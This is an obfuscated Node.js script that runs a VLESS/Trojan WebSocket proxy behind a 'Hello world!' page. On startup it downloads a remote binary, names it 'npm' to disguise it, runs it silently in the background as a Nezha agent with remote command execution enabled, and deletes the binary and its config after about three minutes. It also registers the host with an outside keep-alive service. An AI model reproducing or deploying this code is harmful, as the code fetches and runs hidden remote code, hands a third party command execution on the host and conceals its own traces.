const _0x337f7f=_0x7ba2;(function(_0x4756f2,_0x20ce8b){const _0x7bd8e4=_0x7ba2,_0x4bc140=_0x4756f2();while(!![]){try{const _0x130e6c=-parseInt(_0x7bd8e4(0x1dd))/0x1*(-parseInt(_0x7bd8e4(0x21b))/0x2)+parseInt(_0x7bd8e4(0x1d6))/0x3+-parseInt(_0x7bd8e4(0x1dc))/0x4+-parseInt(_0x7bd8e4(0x1e2))/0x5+parseInt(_0x7bd8e4(0x210))/0x6+-parseInt(_0x7bd8e4(0x23f))/0x7*(-parseInt(_0x7bd8e4(0x1f3))/0x8)+-parseInt(_0x7bd8e4(0x1e6))/0x9*(parseInt(_0x7bd8e4(0x228))/0xa);if(_0x130e6c===_0x20ce8b)break;else _0x4bc140['push'](_0x4bc140['shift']());}catch(_0x5a3596){_0x4bc140['push'](_0x4bc140['shift']());}}}(_0x4f7d,0x79186));const os=require('os'),http=require(_0x337f7f(0x1cf)),fs=require('fs'),axios=require(_0x337f7f(0x232)),net=require(_0x337f7f(0x222)),path=require(_0x337f7f(0x1d9)),crypto=require(_0x337f7f(0x21a)),{Buffer}=require(_0x337f7f(0x1df)),{exec,execSync}=require(_0x337f7f(0x1e9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x337f7f(0x204)]['UUID']||_0x337f7f(0x1e1),NEZHA_SERVER=process[_0x337f7f(0x204)][_0x337f7f(0x20f)]||'',NEZHA_PORT=process['env'][_0x337f7f(0x1ff)]||'',NEZHA_KEY=process[_0x337f7f(0x204)][_0x337f7f(0x23a)]||'',DOMAIN=process[_0x337f7f(0x204)]['DOMAIN']||_0x337f7f(0x20e),AUTO_ACCESS=process[_0x337f7f(0x204)]['AUTO_ACCESS']||!![],WSPATH=process[_0x337f7f(0x204)][_0x337f7f(0x208)]||UUID[_0x337f7f(0x238)](0x0,0x8),SUB_PATH=process[_0x337f7f(0x204)][_0x337f7f(0x22f)]||'sub',NAME=process[_0x337f7f(0x204)][_0x337f7f(0x1de)]||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x24815c=_0x337f7f;try{const _0x348b8b=await axios[_0x24815c(0x1f7)](_0x24815c(0x1d1)),_0x45c120=_0x348b8b[_0x24815c(0x1e5)];ISP=(_0x45c120['country_code']+'-'+_0x45c120[_0x24815c(0x1d8)])['replace'](/ /g,'_');}catch(_0x3c36c8){ISP=_0x24815c(0x23e);}};GetISP();const httpServer=http['createServer']((_0x53de63,_0x5a2d3c)=>{const _0x5a70ec=_0x337f7f;if(_0x53de63[_0x5a70ec(0x234)]==='/'){const _0x2ffe72=path['join'](__dirname,_0x5a70ec(0x1c9));fs['readFile'](_0x2ffe72,'utf8',(_0x3ddb47,_0x244f18)=>{const _0x5140cb=_0x5a70ec;if(_0x3ddb47){_0x5a2d3c[_0x5140cb(0x20b)](0xc8,{'Content-Type':_0x5140cb(0x236)}),_0x5a2d3c['end'](_0x5140cb(0x226));return;}_0x5a2d3c[_0x5140cb(0x20b)](0xc8,{'Content-Type':'text/html'}),_0x5a2d3c['end'](_0x244f18);});return;}else{if(_0x53de63['url']==='/'+SUB_PATH){const _0x59cd35=NAME?NAME+'-'+ISP:ISP,_0x52a159='vless://'+UUID+'@'+DOMAIN+_0x5a70ec(0x1eb)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5a70ec(0x1d7)+WSPATH+'#'+_0x59cd35,_0x5a4d67='trojan://'+UUID+'@'+DOMAIN+_0x5a70ec(0x1f1)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5a70ec(0x1d7)+WSPATH+'#'+_0x59cd35,_0x19e29b=_0x52a159+'\x0a'+_0x5a4d67,_0x2f2d4b=Buffer[_0x5a70ec(0x22c)](_0x19e29b)['toString'](_0x5a70ec(0x207));_0x5a2d3c[_0x5a70ec(0x20b)](0xc8,{'Content-Type':_0x5a70ec(0x212)}),_0x5a2d3c[_0x5a70ec(0x1ee)](_0x2f2d4b+'\x0a');}else _0x5a2d3c[_0x5a70ec(0x20b)](0x194,{'Content-Type':_0x5a70ec(0x212)}),_0x5a2d3c[_0x5a70ec(0x1ee)](_0x5a70ec(0x1f0));}}),wss=new WebSocket[(_0x337f7f(0x239))]({'server':httpServer}),uuid=UUID[_0x337f7f(0x22a)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x46da66){return new Promise((_0x5e540c,_0x2ae800)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x46da66)){_0x5e540c(_0x46da66);return;}let _0x371dfc=0x0;function _0x40f066(){const _0x1cd639=_0x7ba2;if(_0x371dfc>=DNS_SERVERS[_0x1cd639(0x230)]){_0x2ae800(new Error(_0x1cd639(0x1fd)+_0x46da66+_0x1cd639(0x1c7)));return;}const _0xac3c2c=DNS_SERVERS[_0x371dfc];_0x371dfc++;const _0x5de5cf=_0x1cd639(0x1ce)+encodeURIComponent(_0x46da66)+'&type=A';axios[_0x1cd639(0x1f7)](_0x5de5cf,{'timeout':0x1388,'headers':{'Accept':_0x1cd639(0x206)}})[_0x1cd639(0x1ec)](_0x489cff=>{const _0x54e41e=_0x1cd639,_0x4a0bc9=_0x489cff[_0x54e41e(0x1e5)];if(_0x4a0bc9[_0x54e41e(0x21e)]===0x0&&_0x4a0bc9[_0x54e41e(0x1f9)]&&_0x4a0bc9['Answer'][_0x54e41e(0x230)]>0x0){const _0x484788=_0x4a0bc9['Answer'][_0x54e41e(0x1f2)](_0x12f951=>_0x12f951[_0x54e41e(0x1d3)]===0x1);if(_0x484788){_0x5e540c(_0x484788['data']);return;}}_0x40f066();})[_0x1cd639(0x219)](_0xecb9d8=>{_0x40f066();});}_0x40f066();});}function _0x4f7d(){const _0x1bea5e=['find','152AMAcrf','npm\x20download\x20successfully','send','every','get','writeFileSync','Answer','connection','error','npm\x20is\x20already\x20running,\x20skip\x20running...','Failed\x20to\x20resolve\x20','message','NEZHA_PORT','pop','digest','hex','write','env','\x20-p\x20','application/dns-json','base64','WSPATH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','log','writeHead','443','toString','1234.abc.com','NEZHA_SERVER','2530830ZNoKeM','setsid\x20nohup\x20./npm\x20-s\x20','text/plain','Server\x20is\x20running\x20on\x20port\x20','/bin/bash','npm\x20is\x20running','concat','connect','reduce','catch','crypto','1296nwlBGv','post','map','Status','trim','readUInt16BE','8443','net','arm64','https://','sha224','Hello\x20world!','client_secret:\x20','50pmiEAE','npm\x20running\x20error:','replace','substr','from','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','createHash','SUB_PATH','length','https://arm64.ssss.nyc.mn/agent','axios','decode','url','npm','text/html','application/json','slice','Server','NEZHA_KEY','close','2053','utf-8','Unknown','95956RjRhxf','\x20with\x20all\x20DNS\x20servers','false','index.html','2096','arm','config.yaml','pipe','https://dns.google/resolve?name=','http','--tls','https://api.ip.sb/geoip','unlink','type','https://arm64.ssss.nyc.mn/v1','Automatic\x20Access\x20Task\x20added\x20successfully','2967612nHTsLz','&path=%2F','isp','path','error:\x20','true','140100UKdGWn','897qWIutA','NAME','buffer','join','bbcb88a1-2539-4d42-a2e2-c396f7676aea','1651105RhhRbg','readUInt8','includes','data','2504637ebZAGA','aarch64','split','child_process','arch',':443?encryption=none&security=tls&sni=','then','once','end','https://amd64.ssss.nyc.mn/agent','Not\x20Found\x0a',':443?security=tls&sni='];_0x4f7d=function(){return _0x1bea5e;};return _0x4f7d();}function handleVlessConnection(_0x5ec370,_0x56d950){const _0x19aeb2=_0x337f7f,[_0x281098]=_0x56d950,_0x16d6c4=_0x56d950[_0x19aeb2(0x238)](0x1,0x11);if(!_0x16d6c4[_0x19aeb2(0x1f6)]((_0x144265,_0x4f2570)=>_0x144265==parseInt(uuid[_0x19aeb2(0x22b)](_0x4f2570*0x2,0x2),0x10)))return![];let _0x3867f1=_0x56d950[_0x19aeb2(0x238)](0x11,0x12)[_0x19aeb2(0x1e3)]()+0x13;const _0x51cab2=_0x56d950['slice'](_0x3867f1,_0x3867f1+=0x2)[_0x19aeb2(0x220)](0x0),_0x22be6f=_0x56d950[_0x19aeb2(0x238)](_0x3867f1,_0x3867f1+=0x1)[_0x19aeb2(0x1e3)](),_0x4e66ec=_0x22be6f==0x1?_0x56d950[_0x19aeb2(0x238)](_0x3867f1,_0x3867f1+=0x4)['join']('.'):_0x22be6f==0x2?new TextDecoder()[_0x19aeb2(0x233)](_0x56d950[_0x19aeb2(0x238)](_0x3867f1+0x1,_0x3867f1+=0x1+_0x56d950['slice'](_0x3867f1,_0x3867f1+0x1)[_0x19aeb2(0x1e3)]())):_0x22be6f==0x3?_0x56d950[_0x19aeb2(0x238)](_0x3867f1,_0x3867f1+=0x10)[_0x19aeb2(0x218)]((_0x3dfda3,_0x148a05,_0x1cae50,_0x13d12b)=>_0x1cae50%0x2?_0x3dfda3[_0x19aeb2(0x216)](_0x13d12b['slice'](_0x1cae50-0x1,_0x1cae50+0x1)):_0x3dfda3,[])[_0x19aeb2(0x21d)](_0x215bc1=>_0x215bc1[_0x19aeb2(0x220)](0x0)['toString'](0x10))['join'](':'):'';_0x5ec370[_0x19aeb2(0x1f5)](new Uint8Array([_0x281098,0x0]));const _0x530161=createWebSocketStream(_0x5ec370);return resolveHost(_0x4e66ec)['then'](_0x42f39e=>{const _0x1081a6=_0x19aeb2;net[_0x1081a6(0x217)]({'host':_0x42f39e,'port':_0x51cab2},function(){const _0x1f238e=_0x1081a6;this[_0x1f238e(0x203)](_0x56d950[_0x1f238e(0x238)](_0x3867f1)),_0x530161['on']('error',()=>{})[_0x1f238e(0x1cd)](this)['on'](_0x1f238e(0x1fb),()=>{})[_0x1f238e(0x1cd)](_0x530161);})['on'](_0x1081a6(0x1fb),()=>{});})[_0x19aeb2(0x219)](_0x5d3d39=>{const _0x1d389b=_0x19aeb2;net[_0x1d389b(0x217)]({'host':_0x4e66ec,'port':_0x51cab2},function(){const _0x420d79=_0x1d389b;this[_0x420d79(0x203)](_0x56d950['slice'](_0x3867f1)),_0x530161['on'](_0x420d79(0x1fb),()=>{})[_0x420d79(0x1cd)](this)['on'](_0x420d79(0x1fb),()=>{})[_0x420d79(0x1cd)](_0x530161);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2a7c92,_0x5b20fd){const _0x2fe0ba=_0x337f7f;try{if(_0x5b20fd['length']<0x3a)return![];const _0xbd321=_0x5b20fd['slice'](0x0,0x38)[_0x2fe0ba(0x20d)](),_0x1a8aa5=[UUID];let _0x3d4636=null;for(const _0x513905 of _0x1a8aa5){const _0x2d615c=crypto[_0x2fe0ba(0x22e)](_0x2fe0ba(0x225))['update'](_0x513905)[_0x2fe0ba(0x201)](_0x2fe0ba(0x202));if(_0x2d615c===_0xbd321){_0x3d4636=_0x513905;break;}}if(!_0x3d4636)return![];let _0x272b98=0x38;_0x5b20fd[_0x272b98]===0xd&&_0x5b20fd[_0x272b98+0x1]===0xa&&(_0x272b98+=0x2);const _0x16d616=_0x5b20fd[_0x272b98];if(_0x16d616!==0x1)return![];_0x272b98+=0x1;const _0x32a60a=_0x5b20fd[_0x272b98];_0x272b98+=0x1;let _0x50c95b,_0xa592ac;if(_0x32a60a===0x1)_0x50c95b=_0x5b20fd[_0x2fe0ba(0x238)](_0x272b98,_0x272b98+0x4)['join']('.'),_0x272b98+=0x4;else{if(_0x32a60a===0x3){const _0x433680=_0x5b20fd[_0x272b98];_0x272b98+=0x1,_0x50c95b=_0x5b20fd[_0x2fe0ba(0x238)](_0x272b98,_0x272b98+_0x433680)['toString'](),_0x272b98+=_0x433680;}else{if(_0x32a60a===0x4)_0x50c95b=_0x5b20fd[_0x2fe0ba(0x238)](_0x272b98,_0x272b98+0x10)[_0x2fe0ba(0x218)]((_0x35ecc7,_0x28619c,_0x1ffaaf,_0x38340c)=>_0x1ffaaf%0x2?_0x35ecc7[_0x2fe0ba(0x216)](_0x38340c[_0x2fe0ba(0x238)](_0x1ffaaf-0x1,_0x1ffaaf+0x1)):_0x35ecc7,[])[_0x2fe0ba(0x21d)](_0x42344f=>_0x42344f[_0x2fe0ba(0x220)](0x0)[_0x2fe0ba(0x20d)](0x10))[_0x2fe0ba(0x1e0)](':'),_0x272b98+=0x10;else return![];}}_0xa592ac=_0x5b20fd[_0x2fe0ba(0x220)](_0x272b98),_0x272b98+=0x2;_0x272b98<_0x5b20fd['length']&&_0x5b20fd[_0x272b98]===0xd&&_0x5b20fd[_0x272b98+0x1]===0xa&&(_0x272b98+=0x2);const _0x3ee8fd=createWebSocketStream(_0x2a7c92);return resolveHost(_0x50c95b)[_0x2fe0ba(0x1ec)](_0x26434f=>{const _0x258004=_0x2fe0ba;net[_0x258004(0x217)]({'host':_0x26434f,'port':_0xa592ac},function(){const _0x42110b=_0x258004;_0x272b98<_0x5b20fd[_0x42110b(0x230)]&&this[_0x42110b(0x203)](_0x5b20fd[_0x42110b(0x238)](_0x272b98)),_0x3ee8fd['on'](_0x42110b(0x1fb),()=>{})[_0x42110b(0x1cd)](this)['on'](_0x42110b(0x1fb),()=>{})['pipe'](_0x3ee8fd);})['on']('error',()=>{});})[_0x2fe0ba(0x219)](_0x169878=>{net['connect']({'host':_0x50c95b,'port':_0xa592ac},function(){const _0x353ed8=_0x7ba2;_0x272b98<_0x5b20fd[_0x353ed8(0x230)]&&this[_0x353ed8(0x203)](_0x5b20fd[_0x353ed8(0x238)](_0x272b98)),_0x3ee8fd['on'](_0x353ed8(0x1fb),()=>{})[_0x353ed8(0x1cd)](this)['on'](_0x353ed8(0x1fb),()=>{})[_0x353ed8(0x1cd)](_0x3ee8fd);})['on']('error',()=>{});}),!![];}catch(_0x5867e0){return![];}}wss['on'](_0x337f7f(0x1fa),(_0x3d5309,_0x54b0ca)=>{const _0xbcc2cc=_0x337f7f,_0x1d665a=_0x54b0ca[_0xbcc2cc(0x234)]||'';_0x3d5309[_0xbcc2cc(0x1ed)](_0xbcc2cc(0x1fe),_0x44f72c=>{const _0x1bf2b2=_0xbcc2cc;if(_0x44f72c[_0x1bf2b2(0x230)]>0x11&&_0x44f72c[0x0]===0x0){const _0x1adeb3=_0x44f72c[_0x1bf2b2(0x238)](0x1,0x11),_0x31924a=_0x1adeb3['every']((_0x309fc8,_0x3b9f72)=>_0x309fc8==parseInt(uuid[_0x1bf2b2(0x22b)](_0x3b9f72*0x2,0x2),0x10));if(_0x31924a){!handleVlessConnection(_0x3d5309,_0x44f72c)&&_0x3d5309[_0x1bf2b2(0x23b)]();return;}}!handleTrojanConnection(_0x3d5309,_0x44f72c)&&_0x3d5309[_0x1bf2b2(0x23b)]();})['on'](_0xbcc2cc(0x1fb),()=>{});});function _0x7ba2(_0x503436,_0x2d480b){_0x503436=_0x503436-0x1c7;const _0x4f7d96=_0x4f7d();let _0x7ba285=_0x4f7d96[_0x503436];return _0x7ba285;}const getDownloadUrl=()=>{const _0x2896bd=_0x337f7f,_0x1f5410=os[_0x2896bd(0x1ea)]();return _0x1f5410===_0x2896bd(0x1cb)||_0x1f5410===_0x2896bd(0x223)||_0x1f5410===_0x2896bd(0x1e7)?!NEZHA_PORT?_0x2896bd(0x1d4):_0x2896bd(0x231):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x2896bd(0x1ef);},downloadFile=async()=>{const _0x2acb1c=_0x337f7f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xa59d63=getDownloadUrl(),_0x18db27=await axios({'method':_0x2acb1c(0x1f7),'url':_0xa59d63,'responseType':'stream'}),_0x45cf84=fs['createWriteStream'](_0x2acb1c(0x235));return _0x18db27[_0x2acb1c(0x1e5)]['pipe'](_0x45cf84),new Promise((_0x353893,_0x5be4a3)=>{const _0x2e517a=_0x2acb1c;_0x45cf84['on']('finish',()=>{const _0x2850ae=_0x7ba2;console['log'](_0x2850ae(0x1f4)),exec('chmod\x20+x\x20npm',_0x68d24=>{if(_0x68d24)_0x5be4a3(_0x68d24);_0x353893();});}),_0x45cf84['on'](_0x2e517a(0x1fb),_0x5be4a3);});}catch(_0x1c5f41){throw _0x1c5f41;}},runnz=async()=>{const _0x312874=_0x337f7f;try{const _0x7210e6=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x312874(0x23d)});if(_0x7210e6[_0x312874(0x21f)]()!==''){console['log'](_0x312874(0x1fc));return;}}catch(_0x2e0fec){}await downloadFile();let _0x151d17='',_0x340ad9=[_0x312874(0x20c),_0x312874(0x221),_0x312874(0x1ca),'2087','2083',_0x312874(0x23c)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xfad707=_0x340ad9[_0x312874(0x1e4)](NEZHA_PORT)?_0x312874(0x1d0):'';_0x151d17=_0x312874(0x211)+NEZHA_SERVER+':'+NEZHA_PORT+_0x312874(0x205)+NEZHA_KEY+'\x20'+_0xfad707+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4743d5=NEZHA_SERVER[_0x312874(0x1e4)](':')?NEZHA_SERVER[_0x312874(0x1e8)](':')[_0x312874(0x200)]():'',_0xc933c9=_0x340ad9[_0x312874(0x1e4)](_0x4743d5)?_0x312874(0x1db):_0x312874(0x1c8),_0x5ec749=_0x312874(0x227)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x312874(0x209)+_0xc933c9+_0x312874(0x22d)+UUID;fs[_0x312874(0x1f8)]('config.yaml',_0x5ec749);}_0x151d17='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x151d17,{'shell':_0x312874(0x214)},_0x18a0b7=>{const _0x58621e=_0x312874;if(_0x18a0b7)console['error'](_0x58621e(0x229),_0x18a0b7);else console[_0x58621e(0x20a)](_0x58621e(0x215));});}catch(_0x250fa2){console['error'](_0x312874(0x1da)+_0x250fa2);}};async function addAccessTask(){const _0x2abbf9=_0x337f7f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3b9d4e=_0x2abbf9(0x224)+DOMAIN;try{const _0x268c9c=await axios[_0x2abbf9(0x21c)]('https://oooo.serv00.net/add-url',{'url':_0x3b9d4e},{'headers':{'Content-Type':_0x2abbf9(0x237)}});console['log'](_0x2abbf9(0x1d5));}catch(_0x21f138){}}const delFiles=()=>{const _0x4fd509=_0x337f7f;fs[_0x4fd509(0x1d2)]('npm',()=>{}),fs['unlink'](_0x4fd509(0x1cc),()=>{});};httpServer['listen'](PORT,()=>{const _0x5b1db3=_0x337f7f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5b1db3(0x20a)](_0x5b1db3(0x213)+PORT);});
